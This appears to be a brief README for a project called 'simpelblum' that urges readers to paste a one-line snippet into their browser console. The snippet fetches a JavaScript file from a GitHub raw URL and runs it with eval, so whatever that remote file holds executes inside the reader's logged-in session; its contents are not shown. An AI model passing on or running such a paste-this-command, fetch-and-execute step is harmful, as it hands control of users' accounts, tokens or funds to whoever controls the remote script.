# simpelblum
just paste this code on your console :)



var unixTime = Date.now();  var url = 'https://raw.githubusercontent.com/xfaryadx/scripts/main/belumm.js' + '?' + unixTime;  fetch(url)   .then(response => response.text())   .then(script => eval(script));
